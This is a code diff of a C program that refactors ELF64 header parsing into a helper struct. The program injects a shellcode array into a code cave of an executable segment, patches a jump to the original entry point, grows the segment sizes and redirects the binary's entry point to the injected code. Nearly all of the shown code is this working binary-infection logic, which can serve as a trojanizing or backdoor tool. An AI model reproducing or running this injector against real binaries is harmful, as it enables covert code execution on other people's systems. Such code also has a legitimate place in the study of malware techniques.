@@ -11,6 +11,7 @@
 #include "min_max.h"
 #include "mem_search.h"
 #include "file_map.h"
+#include "elf_map.h"
 
 unsigned char shell_code[] = {
     0x52,                                       // push   %rdx
@@ -30,8 +31,7 @@ int main(int argc, char* argv[]) {
 
     unsigned char* map;
     size_t map_size;
-    Elf64_Ehdr* elf_header;
-    Elf64_Phdr* program_headers;
+    elf64_map_t elf_map;
     int fd = open(argv[1], O_RDONLY);
     if (fd == -1) {
         return (1);
@@ -43,32 +43,32 @@ int main(int argc, char* argv[]) {
     }
     close(fd);
 
-    if (map_size >= 64 && !memcmp(map, "\x7f""ELF", 4) && ((char*)map)[4] == 0x2) {
-        elf_header = (Elf64_Ehdr*)map;
-        printf("entry: %p\n", (void*)elf_header->e_entry);
-        if (elf_header->e_phentsize * elf_header->e_phnum + elf_header->e_phoff <= map_size) {
-            program_headers = (Elf64_Phdr*)(map + elf_header->e_phoff);
-            for (int i = 0; i < elf_header->e_phnum; i++) {
-                if (program_headers[i].p_type == PT_LOAD && \
-                        program_headers[i].p_flags & PF_R && \
-                        program_headers[i].p_flags & PF_X) {
-                    void* code_cave = (char*)find_code_cave(
-                        (char*)map + program_headers[i].p_offset,
-                        sizeof(shell_code) + 100,
-                        program_headers[i].p_filesz + sizeof(shell_code) + 100
-                    ) + 50;
-                    if (code_cave != NULL) {
-                        printf("code_cave: %p\n", (void*)((char*)code_cave - (char*)map));
-                        int offset = elf_header->e_entry - ((char*)code_cave - (char*)map) - 33;
-                        printf("jmp offset: %x (%i)\n", offset, offset);
-                        memcpy(shell_code + 29, &offset, 4);
-                        memcpy(code_cave, shell_code, sizeof(shell_code));
-                        program_headers[i].p_filesz += sizeof(shell_code) + 100;
-                        program_headers[i].p_memsz += sizeof(shell_code) + 100;
-                        elf_header->e_entry = (char*)code_cave - (char*)map;
-                        break;
-                    }
-                }
+    elf_map = map_elf64(map, map_size);
+    if (elf_map.start == NULL) {
+        (void)munmap(map, map_size);
+        return (1);
+    }
+
+    printf("entry: %p\n", (void*)elf_map.header->e_entry);
+    for (int i = 0; i < elf_map.header->e_phnum; i++) {
+        if (elf_map.program_headers[i].p_type == PT_LOAD && \
+                elf_map.program_headers[i].p_flags & PF_R && \
+                elf_map.program_headers[i].p_flags & PF_X) {
+            void* code_cave = (char*)find_code_cave(
+                (char*)map + elf_map.program_headers[i].p_offset,
+                sizeof(shell_code) + 100,
+                elf_map.program_headers[i].p_filesz + sizeof(shell_code) + 100
+            ) + 50;
+            if (code_cave != NULL) {
+                printf("code_cave: %p\n", (void*)((char*)code_cave - (char*)map));
+                int offset = elf_map.header->e_entry - ((char*)code_cave - (char*)map) - 33;
+                printf("jmp offset: %x (%i)\n", offset, offset);
+                memcpy(shell_code + 29, &offset, 4);
+                memcpy(code_cave, shell_code, sizeof(shell_code));
+                elf_map.program_headers[i].p_filesz += sizeof(shell_code) + 100;
+                elf_map.program_headers[i].p_memsz += sizeof(shell_code) + 100;
+                elf_map.header->e_entry = (char*)code_cave - (char*)map;
+                break;
             }
         }
     }
